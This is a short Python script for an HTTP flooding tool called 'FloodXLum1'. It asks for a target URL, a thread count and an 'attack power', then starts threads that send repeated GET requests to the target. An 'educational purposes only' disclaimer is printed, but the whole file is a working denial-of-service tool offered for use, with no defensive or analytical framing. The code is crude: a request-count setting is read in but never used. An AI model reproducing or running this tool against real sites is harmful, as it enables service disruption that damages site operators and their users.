import requests
import threading
from termcolor import colored
from colorama import init
from pyfiglet import Figlet

init()

target = "http://example.com"

num_requests = 100
num_threads = 5
attack_power = 1

def flood():
    for _ in range(attack_power):
        requests.get(target)
    print(colored("[*] Request sent", "green"))

def print_banner():
    custom_fig = Figlet(font='slant')
    banner = custom_fig.renderText('FloodXLum1')
    colored_banner = colored(banner, 'red')
    print(colored_banner)

def main():
    print_banner()
    print(colored("[!] Warning: This tool is for educational purposes only. Use responsibly.", "yellow"))

    global target, num_requests, num_threads, attack_power
    target = input("Enter the target URL (default: http://example.com): ") or target
    num_requests = int(input("Enter the number of requests to send (default: 100): ") or num_requests)
    num_threads = int(input("Enter the number of threads (default: 5): ") or num_threads)
    attack_power = int(input("Enter the attack power (requests per thread, default: 1): ") or attack_power)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
